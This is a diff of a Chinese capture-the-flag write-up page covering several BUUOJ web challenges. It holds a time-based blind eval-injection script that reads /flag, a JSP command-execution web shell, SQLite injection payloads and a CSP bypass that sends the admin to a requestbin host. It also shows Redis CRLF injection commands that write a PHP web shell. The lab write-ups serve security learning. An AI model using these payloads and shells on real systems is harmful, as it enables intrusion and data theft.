@@ -54,8 +54,21 @@
 <meta property="og:image" content="https://i.loli.net/2020/04/03/gkPVxbNFGzUsZrp.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/03/SAZHRkq671jEVGy.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/03/qIrw9RXeLTcYmVW.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/AFEOgWTtdUxVMZP.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/So5rJf6M4Ad2a1H.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/DGPsC8Sv9oZlVBK.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/Mdtm1iqlVuwpS3e.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/TrBQgd87snlKWc9.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/Z6d2enr93xELhYD.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/Lcq9Dki4Txrb6uX.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/luZHzXQ2r4govGq.png">
+<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-10_16-19-25.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/R2foi9Uwq4LsKeN.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/cnbIqUS27PLYlNg.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/SD1zpF7GAEX8wM3.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/10/6BsSuMCaQxVKmEh.png">
 <meta property="article:published_time" content="2020-04-02T13:32:32.000Z">
-<meta property="article:modified_time" content="2020-04-08T06:55:45.948Z">
+<meta property="article:modified_time" content="2020-04-10T09:35:37.910Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
@@ -176,6 +189,10 @@
 <li><a href="#wustctf2020train-yourself-to-be-godly">[WUSTCTF2020]Train Yourself To Be Godly</a></li>
 <li><a href="#wustctf2020easyweb">[WUSTCTF2020]easyweb</a></li>
 <li><a href="#zer0pts2020phpnantokaadm">[Zer0pts2020]phpNantokaAdm</a></li>
+<li><a href="#zer0pts2020musicblog">[Zer0pts2020]musicblog</a></li>
+<li><a href="#zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?</a></li>
+<li><a href="#zer0pts2020urlapp">[Zer0pts2020]urlapp</a></li>
+<li><a href="#zer0pts2020notepad">[Zer0pts2020]notepad</a></li>
 </ul>
 <!-- tocstop -->
 
@@ -271,6 +288,7 @@
 <p>测试成功</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://39b0719c-b348-4b9c-af1f-8f62ab554bf7.node3.buuoj.cn/calculate'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(payload)</span>:</span></span><br><span class="line">    print(<span class="string">'eval(%s)'</span> % (<span class="string">'+'</span>.join(<span class="string">'chr(%d)'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> payload)))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'eval(%s)'</span> % (<span class="string">'+'</span>.join(<span class="string">'chr(%d)'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> payload))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(bool_expr)</span>:</span></span><br><span class="line">    payload = <span class="string">"__import__('time').sleep(5) if %s else 1"</span> % bool_expr</span><br><span class="line">    t = time()</span><br><span class="line">    r = requests.post(url, json=&#123;<span class="string">'isVip'</span>: <span class="literal">True</span>, <span class="string">'expression'</span>: encode(payload)&#125;)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    delta = time() - t</span><br><span class="line">    print(payload, delta)</span><br><span class="line">    <span class="keyword">return</span> delta &gt; <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(geq_expression, l, r)</span>:</span></span><br><span class="line">    eq_expression = geq_expression.replace(<span class="string">'&gt;='</span>, <span class="string">'=='</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> (r - l) &lt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">for</span> mid <span class="keyword">in</span> range(l, r + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> query(eq_expression.format(num=mid)):</span><br><span class="line">                    <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'NOT FOUND'</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> query(geq_expression.format(num=mid)):</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag_len = binary_search("len(open('/flag').read())&gt;=&#123;num&#125;", 0, 100)</span></span><br><span class="line">flag_len = <span class="number">50</span></span><br><span class="line">print(<span class="string">'flag length: %d'</span> % flag_len)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'flag&#123;cef388f4-71a6-41d9-b0c1-3dcd5e3'</span></span><br><span class="line"><span class="keyword">while</span> len(flag) &lt; flag_len:</span><br><span class="line">    c = binary_search(<span class="string">"ord(open('/flag').read()[%d])&gt;=&#123;num&#125;"</span> % len(flag), <span class="number">0</span>, <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">if</span> c:   <span class="comment"># the bs may fail due to network issues</span></span><br><span class="line">        flag += chr(c)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
 
+<hr>
 <h4><span id="wustctf2020train-yourself-to-be-godly">[WUSTCTF2020]Train Yourself To Be Godly</span></h4><p> 打开页面是tomcat，影响较大的有三个历史漏洞，这里考的是<strong>弱口令 &amp;&amp; 后台getshell漏洞</strong></p>
 <p>利用 <code>..;/</code>可以穿越目录，从而返回上一层，<code>/..;/manager/html</code>进入管理页面，弱密码<code>tomcat:tomcat</code>登录后台，但是直接上传war包由于路径问题导致上传失败。</p>
 <p><img src="https://i.loli.net/2020/04/03/LmSRu4fcEXvW8ZD.png" alt="Snipaste_2020-04-03_12-48-56.png"></p>
@@ -291,6 +309,7 @@
 <p><img src="https://i.loli.net/2020/04/03/SAZHRkq671jEVGy.png" alt="Snipaste_2020-04-03_21-00-06.png"></p>
 <p>冰蝎</p>
 <p><img src="https://i.loli.net/2020/04/03/qIrw9RXeLTcYmVW.png" alt="Snipaste_2020-04-03_20-46-23.png"></p>
+<hr>
 <h4><span id="wustctf2020easyweb">[WUSTCTF2020]easyweb</span></h4><p>上传文件之后存在下载操作，任意文件读取漏洞</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;download?file&#x3D;3e6916d2-645a-4d6a-8adf-9eff8ad74d89.jpeg</span><br></pre></td></tr></table></figure>
 
@@ -305,7 +324,103 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*&quot;%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(&quot;Executing command&quot;);</span><br><span class="line">Process p &#x3D; Runtime.getRuntime().exec(&quot;ls &#x2F;&quot;);</span><br><span class="line">OutputStream os &#x3D; p.getOutputStream();</span><br><span class="line">InputStream in &#x3D; p.getInputStream();</span><br><span class="line">DataInputStream dis &#x3D; new DataInputStream(in);</span><br><span class="line">String disr &#x3D; dis.readLine();</span><br><span class="line">while ( disr !&#x3D; null ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr &#x3D; dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
 <p>能成功执行命令，但是回显有点奇怪，反弹shell也失败，jsp不能使用``包裹命令直接带出，最后用@Mrkaixin的木马反弹shell成功</p>
-<h4><span id="zer0pts2020phpnantokaadm">[Zer0pts2020]phpNantokaAdm</span></h4>
+<hr>
+<h4><span id="zer0pts2020phpnantokaadm">[Zer0pts2020]phpNantokaAdm</span></h4><p>给了源码</p>
+<p><code>index.php</code></p>
+<p><img src="https://i.loli.net/2020/04/10/AFEOgWTtdUxVMZP.png" alt="Snipaste_2020-04-10_12-22-47.png"></p>
+<p>sqlite数据库，存在明显的sql注入，跟进<code>is_vaild()</code></p>
+<p><img src="https://i.loli.net/2020/04/10/So5rJf6M4Ad2a1H.png" alt="Snipaste_2020-04-10_12-24-25.png"></p>
+<p>构造形式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE $table (dummy1 TEXT,dummy2 TEXT,&#96;$column&#96; $type);</span><br></pre></td></tr></table></figure>
+
+<p>=&gt;</p>
+<blockquote>
+<p>本地测试可以利用<a href="https://www.phpliteadmin.org/download/" target="_blank" rel="noopener">phpliteadmin</a></p>
+</blockquote>
+<p>在执行sql语句前出现了其他查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$pdo-&gt;query(&#39;CREATE TABLE &#96;&#39; . FLAG_TABLE . &#39;&#96; (&#96;&#39; . FLAG_COLUMN . &#39;&#96; TEXT);&#39;);</span><br><span class="line">$pdo-&gt;query(&#39;INSERT INTO &#96;&#39; . FLAG_TABLE . &#39;&#96; VALUES (&quot;&#39; . FLAG . &#39;&quot;);&#39;);</span><br><span class="line">$pdo-&gt;query($sql);</span><br></pre></td></tr></table></figure>
+
+<p>1、在<strong>创建表</strong>时可以用<code>as</code>来复制另一个表中的数据。这里我们就可以用<code>as select sql from sqlite_master</code>来复制<code>sqlite_master</code>的<code>sql</code>字段。 </p>
+<p>2、 双引号被过滤了，在sqlite中可以用中括号<code>[]</code>来代替。 </p>
+<p>3、使用<code>as</code>+表别名是指在一个特定的 SQLite 语句中重命名表。重命名是临时的改变，在数据库中实际的表的名称不会改变。 列别名用来为某个特定的 SQLite 语句重命名表中的列。 和其他数据库类似，别名的关键字<code>as</code>可以被省略 </p>
+<p>构造如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE a as select sql as[ (dummy1 TEXT, dummy2 TEXT, &#96;]from sqlite_master;&#96; 2);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/04/10/DGPsC8Sv9oZlVBK.png" alt="Snipaste_2020-04-10_14-08-20.png"></p>
+<p>=&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name&#x3D;a as select sql as[&amp;columns[0][name]&#x3D;]from sqlite_master;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/04/10/Mdtm1iqlVuwpS3e.png" alt="Snipaste_2020-04-10_13-38-46.png"></p>
+<p>第二次查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name&#x3D;a as select flag_2a2d04c3 as[&amp;columns[0][name]&#x3D;]from flag_bf1811da;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4><span id="zer0pts2020musicblog">[Zer0pts2020]musicblog</span></h4><p>查看源码，发现flag在<code>worker.js</code>中设置在浏览器UA中</p>
+<p><img src="https://i.loli.net/2020/04/10/TrBQgd87snlKWc9.png" alt="Snipaste_2020-04-10_14-48-18.png"></p>
+<p>admin会自动点击<code>#like</code>标签</p>
+<p>观察插入content的地方</p>
+<p><img src="https://i.loli.net/2020/04/10/Z6d2enr93xELhYD.png" alt="Snipaste_2020-04-10_14-29-52.png"></p>
+<p>而这个<code>strip_tags()</code>存在bug</p>
+<p><code>strip_tags site:bugs.php.net</code></p>
+<blockquote>
+<p><a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a> </p>
+</blockquote>
+<p><code>&lt;audio&gt;</code>标签受CSP限制，这里可以利用bug构造一个<code>&lt;a&gt;</code>标签绕过CSP的限制</p>
+<p>构造<code>&lt;a/udio id=like href=//http.requestbin.buuoj.cn/x6l5fvx6&gt;aa</code></p>
+<p>自己测试下成功跳转，然后等待admin点击即可</p>
+<hr>
+<h4><span id="zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?</span></h4><p>源码</p>
+<p><img src="https://i.loli.net/2020/04/10/Lcq9Dki4Txrb6uX.png" alt="Snipaste_2020-04-10_15-07-39.png"></p>
+<p> <code>$_SERVER[&#39;PHP_SELF&#39;]</code>表示当前执行脚本的文件名，</p>
+<p>构造<code>/index.php/config.php?source</code></p>
+<p>但是这里正则匹配<code>/config\.php\/*$/i</code></p>
+<p>匹配形式如<code>config.php///</code>的字符串</p>
+<p>搜索<code>basename()</code>的bug</p>
+<p><code>basename site:bugs.php.net</code></p>
+<blockquote>
+<p><a href="https://bugs.php.net/bug.php?id=62119" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=62119</a> </p>
+</blockquote>
+<p><code>basename()</code>会丢弃文件名中非ASCII字符。</p>
+<p>加在结尾，可以成功绕过正则<code>/index.php/config.php/%ff?source</code></p>
+<hr>
+<h4><span id="zer0pts2020urlapp">[Zer0pts2020]urlapp</span></h4><blockquote>
+<p><a href="https://www.anquanke.com/post/id/200927" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200927</a> </p>
+</blockquote>
+<p>url缩短，用redis存储</p>
+<p>查看redis配置文件</p>
+<p><img src="https://i.loli.net/2020/04/10/luZHzXQ2r4govGq.png" alt="Snipaste_2020-04-10_16-16-28.png"></p>
+<p>禁用了一些指令</p>
+<p>处理过程</p>
+<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-10_16-19-25.png" alt="Snipaste_2020-04-10_16-19-25"></p>
+<p>如果是POST请求，对传入的url进行正则检测，调用<code>set()</code>函数</p>
+<p><img src="https://i.loli.net/2020/04/10/R2foi9Uwq4LsKeN.png" alt="Snipaste_2020-04-10_16-31-32.png"></p>
+<p>相当于发送redis命令，这里存在CRLF注入，直接操作redis。</p>
+<p>比如常见的些shell或者定时任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">config set dir &#x2F;var&#x2F;www</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>但是常用的redis执行被禁用，比如<code>CONFIG</code></p>
+<p>参考wp，这里找到了<code>BITOP</code>命令，可以对key做位运算，并把结果保存到新key里。 </p>
+<blockquote>
+<p><a href="https://redis.io/commands/bitop" target="_blank" rel="noopener">https://redis.io/commands/bitop</a> </p>
+</blockquote>
+<p>构造16位符合条件的文件名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET tmp 1</span><br><span class="line">BITOP XOR abababababababab flag tmp</span><br></pre></td></tr></table></figure>
+
+<p>即写入<code>abababababababab</code>中</p>
+<p><img src="https://i.loli.net/2020/04/10/cnbIqUS27PLYlNg.png" alt="Snipaste_2020-04-10_16-20-13.png"></p>
+<p><img src="https://i.loli.net/2020/04/10/SD1zpF7GAEX8wM3.png" alt="Snipaste_2020-04-10_17-06-57.png"></p>
+<p>一开始q访问出现404</p>
+<p>这里的思路是利用<code>setbit</code>把某一位变成<code>?</code> 或者<code>/</code></p>
+<p><code>1</code>和<code>f</code>异或得到<code>W</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">W&#x3D;&gt;01010111</span><br><span class="line">?&#x3D;&gt;00111111</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>setbit</code>讲<code>W</code>转化为<code>?</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SET tmp 1</span><br><span class="line">BITOP XOR abababababababab flag tmp</span><br><span class="line">setbit abababababababab 1 0</span><br><span class="line">setbit abababababababab 2 1</span><br><span class="line">setbit abababababababab 4 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/04/10/6BsSuMCaQxVKmEh.png" alt="Snipaste_2020-04-10_17-16-25.png"></p>
+<hr>
+<h4><span id="zer0pts2020notepad">[Zer0pts2020]notepad</span></h4><p>flask框架</p>
+
             </div>
           
 
